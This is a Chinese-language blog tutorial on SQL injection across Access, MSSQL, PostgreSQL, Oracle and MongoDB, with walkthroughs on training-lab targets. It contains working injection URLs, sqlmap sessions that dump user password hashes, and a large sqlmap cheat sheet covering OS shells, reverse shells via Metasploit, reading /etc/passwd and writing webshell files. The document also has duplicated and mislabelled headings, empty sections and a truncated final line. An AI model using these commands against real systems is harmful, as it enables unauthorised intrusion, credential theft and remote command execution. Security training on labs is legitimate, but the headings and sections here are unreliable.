# 原创
：  Web漏洞-access注入、Sql Sever（Mssql）注入、PostgreSql注入、Orache注入、MongoDB注入、Oracle注入-SQLmap使用教程-附实例

# Web漏洞-access注入、Sql Sever（Mssql）注入、PostgreSql注入、Orache注入、MongoDB注入、Oracle注入-SQLmap使用教程-附实例

## 一、导图

## 二、各种数据库的注入特点

### 1.access注入 

```
access数据库：
access
    表名
        列名
            数据

mysql、mssql等数据库：
    数据库名
        表名
            列名
                数据

---&gt;比正常其它数据库少一级，其数据库保存在网站原码下面。

---&gt;后缀格式为mdb、asp、asa，可以通过一些暴库手段、目录猜解等直接下载数据库。

---&gt;另一个网站的数据库假如也是access，则其数据库也保存在它自己网站原码的目录下，
    和上一个网站没有任何关系，将不存在跨库注入。

---&gt;access没有文件读写。

---&gt;access三大攻击手法
1.access注入攻击片段-联合查询法
2.access注入攻击片段-逐字猜解法
3.工具类的使用注入（推荐）

---&gt;access注入攻击方式
主要有：union注入、http header注入、偏移注入等
```

#### 实例

本实例来自墨者学院

第一步：判断字段数

```
219.153.49.228:49079/new_list.asp?id=1%20order%20by%204
返回页面正常
219.153.49.228:49079/new_list.asp?id=1%20order%20by%205
返回页面不正常
 
------&gt;列数（字段数）为：4
```

第二步：猜解表名

因为access数据库不包含数据库名，所以直接从表名开始查询。

因为access数据我库不像Mysql数据库中存在系统数据库“information_schema”，所以在注入过程中需要我们进行暴力猜解。

```
向网站末尾添加猜测的表名
如果数据库中存在此表，网页就会返回数字
如果数据库中不存在此表，网页就会返回错误
```

```
219.153.49.228:49079/new_listasp?id=1%20union%20select%201,2,3,4%20from%20admin
页面返回数字，存在表名admin
219.153.49.228:49079/new_listasp?id=1%20union%20select%201,2,3,4%20from%20dsadasdasd
页面返回错误，不存在表名dsadasdasd
```

第三步：猜解列名

猜解完表明后用同样的方法猜解列名

```
向网站内添加猜测的列名
如果数据库中存在此列，网页就会返回相应数据
如果数据库中不存在此列，网页就会返回错误
```

```
219.153.49.228:49079/new_list.asp?id=1%20union%20select%201,username,passwd,4%20from%20admin

经过不断猜解，最终正确列名为username和passwd，成功查询出了数据。
```

第四步：密码解密

第五步：登录后台获取KEY

第六步：提交KEY

### 2.Sql Sever（Mssql）注入

详细内容可参考“[MSSQL注入](https://www.cnblogs.com/xishaonian/p/6173644.html)”

Sql Sever注入

#### 实例

本实例来自墨者学院

判断数据库类型

判断数据库版本

使用工具

Mysql注入

------&gt;注意与Mysql进行对比。

判断数据库版本

### 3.PostgreSql注入

#### 实例

本实例来自墨者学院

数据库识别

```
┌──(root💀kali)-[~]
└─# sqlmap -u http://219.153.49.228:44677/new_list.php?id=1
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.11#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:44:22 /2021-06-23/
[12:44:28] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:44:28] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[12:44:28] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[12:44:28] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[12:44:28] [INFO] testing 'Generic inline queries'
[12:44:28] [INFO] testing 'PostgreSQL inline queries'
[12:44:28] [INFO] testing 'PostgreSQL &gt; 8.1 stacked queries (comment)'
[12:44:29] [INFO] testing 'PostgreSQL &gt; 8.1 stacked queries'
[12:44:29] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[12:44:29] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
```

查看数据库权限

```
┌──(root💀kali)-[~]
└─# sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -privileges --level 3
database management system users privileges:
[*] postgres (administrator) [2]:
    privilege: createdb
    privilege: super
┌──(root💀kali)-[~]
└─# sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 --is-dba --level 3
[12:56:40] [INFO] testing if current user is DBA
current user is DBA: True
```

查看当前数据库

```
┌──(root💀kali)-[~]
└─# sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 --current-db --batch
[13:12:38] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[13:12:38] [INFO] fetching current database
[13:12:38] [WARNING] on PostgreSQL you'll need to use schema names for enumeration as the counterpart to database names on other DBMSes
current database (equivalent to schema on PostgreSQL): 'public'
[13:12:38] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/219.153.49.228'
[13:12:38] [WARNING] your sqlmap version is outdated
```

查看数据表

```
┌──(root💀kali)-[~]
└─# sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public --tables
Database: public
[2 tables]
+-----------+
| notice    |
| reg_users |
+-----------+

[13:17:46] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/219.153.49.228'
[13:17:46] [WARNING] your sqlmap version is outdated
```

查看字段

```
┌──(root💀kali)-[~]
└─# sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public -T reg_users --columns
Database: public
Table: reg_users
[4 columns]
+----------+---------+
| Column   | Type    |
+----------+---------+
| id       | int4    |
| name     | varchar |
| password | varchar |
| status   | int4    |
+----------+---------+
```

获取数据

```
┌──(root💀kali)-[~]
└─# sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public -T reg_users -C "name,password" --dump --batch
[2 entries]
+--------+----------------------------------+
| name   | password                         |
+--------+----------------------------------+
| mozhe2 | 1c63129ae9db9c60c3e8aa94d3e00495 |
| mozhe1 | aa92e4057b30d003d87b61b1b12ae909 |
+--------+----------------------------------+
```

最后将password解密后进入后台复制KEY提交即可。

#### 区别

这里是一个跟Mysql数据库的一个不同的位置，PostgreSql数据库union select后用null补充字段。

```
219.153.49.228:45238/new_list.php?id=1%20union%20select%20null,null,null,null
```

### 4.Oracle注入

详细内容可参考“[Oracle注入](https://www.cnblogs.com/peterpan0707007/p/8242119.html)”

实例

本实例来自墨者学院

使用工具查看

### 5.MongoDB注入

参考文档：[https://www.cnblogs.com/wefeng/p/11503102.html](https://www.cnblogs.com/wefeng/p/11503102.html)

### 4.Oracle注入

详细内容可参考“[Python操作MongoDB文档数据库](https://www.cnblogs.com/wefeng/p/11503102.html)”

SQLmap不能识别MongoDB，所以引入[nosqlattack](https://github.com/youngyangyang04/NoSQLAttack)（此工具只能安装在Linux上）。

区别

Mongodb的查询文档方式与其他的数据库略微不同，当进行条件查询的时候，mysql是用where，而mongodb是以键值对形式（类似于JSON）进行查询的。

在进行注入时，要注意对'{(进行闭合。

实例

本实例来自墨者学院

工具打开后首先进行一系列配置

配置好后输入4开始

## 三、SQLmap使用方法

[sqlmap使用教程](https://blog.csdn.net/Gherbirthday0916/article/details/126857683)

```
基本操作笔记：-u  #注入点 
-f  #指纹判别数据库类型 
-b  #获取数据库版本信息 
-p  #指定可测试的参数(?page=1&amp;id=2 -p "page,id") 
-D ""  #指定数据库名 
-T ""  #指定表名 
-C ""  #指定字段 
-s ""  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s "xx.log"　　恢复:-s "xx.log" --resume) 
--level=(1-5) #要执行的测试水平等级，默认为1 
--risk=(0-3)  #测试执行的风险等级，默认为1 
--time-sec=(2,5) #延迟响应，默认为5 
--data #通过POST发送数据 
--columns        #列出字段 
--current-user   #获取当前用户名称 
--current-db     #获取当前数据库名称 
--users          #列数据库所有用户 
--passwords      #数据库用户所有密码 
--privileges     #查看用户权限(--privileges -U root) 
-U               #指定数据库用户 
--dbs            #列出所有数据库 
--tables -D ""   #列出指定数据库中的表 
--columns -T "user" -D "mysql"      #列出mysql数据库中的user表的所有字段 
--dump-all            #列出所有数据库所有表 
--exclude-sysdbs      #只列出用户自己新建的数据库和表 
--dump -T "" -D "" -C ""   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) 
--dump -T "" -D "" --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 
--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) 
--os      #指定系统(Linux,Windows) 
-v  #详细的等级(0-6) 
    0：只显示Python的回溯，错误和关键消息。 
    1：显示信息和警告消息。 
    2：显示调试消息。 
    3：有效载荷注入。 
    4：显示HTTP请求。 
    5：显示HTTP响应头。 
    6：显示HTTP响应页面的内容 
--privileges  #查看权限 
--is-dba      #是否是数据库管理员 
--roles       #枚举数据库用户角色 
--udf-inject  #导入用户自定义函数（获取系统权限） 
--union-check  #是否支持union 注入 
--union-cols #union 查询表记录 
--union-test #union 语句测试 
--union-use  #采用union 注入 
--union-tech orderby #union配合order by 
--data "" #POST方式提交数据(--data "page=1&amp;id=2") 
--cookie "用;号分开"      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) 
--referer ""     #使用referer欺骗(--referer "http://www.baidu.com") 
--user-agent ""  #自定义user-agent 
--proxy "http://127.0.0.1:8118" #代理注入 
--string=""    #指定关键词,字符串匹配. 
--threads 　　  #采用多线程(--threads 3) 
--sql-shell    #执行指定sql命令 
--sql-query    #执行指定的sql语句(--sql-query "SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1" ) 
--file-read    #读取指定文件 
--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) 
--file-dest    #要写入的文件绝对路径 
--os-cmd=id    #执行系统命令 
--os-shell     #系统交互shell 
--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) 
--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) 
--os-smbrelay  # 
--os-bof       # 
--reg-read     #读取win系统注册表 
--priv-esc     # 
--time-sec=    #延迟设置 默认--time-sec=5 为5秒 
-p "user-agent" --user-agent "sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)"  #指定user-agent注入 
--eta          #盲注 
/pentest/database/sqlmap/txt/
common-columns.txt　　字段字典　　　 
common-outputs.txt 
common-tables.txt      表字典 
keywords.txt 
oracle-default-passwords.txt 
user-agents.txt 
wordlist.txt 

常用语句 :
1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 
2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 
3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 
4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C "user,pass"  -v 1 --exclude-sysdbs 
5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 
6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read "c:\boot.ini" -v 2 
7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 
8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd "id" -v 1 
9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 
10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 
11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 
12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 
13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key="HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1 
14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta 
15./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "')" --suffix "AND ('abc'='abc"
16./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"
17./sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"
18./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 
19./sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo'" -v 1 
20./sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb --banner 
21./sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --cookie="PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low" --string='xx' --dbs --level=3 -p "uid"

简单的注入流程 :
1.读取数据库版本，当前用户，当前数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 
2.判断当前数据库用户权限 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 
3.读取所有数据库用户或指定数据库用户的密码 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 
4.获取所有数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 
5.获取指定数据库中的所有表 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 
6.获取指定数据库名中指定表的字段 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 
7.获取指定数据库名中指定表中指定字段的数据 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C "username,password" -s "sqlnmapdb.log" -v 2 
8.file-read读取web文件 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read "/etc/passwd" -v 2 
9.file-write写入文件到web 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试
```
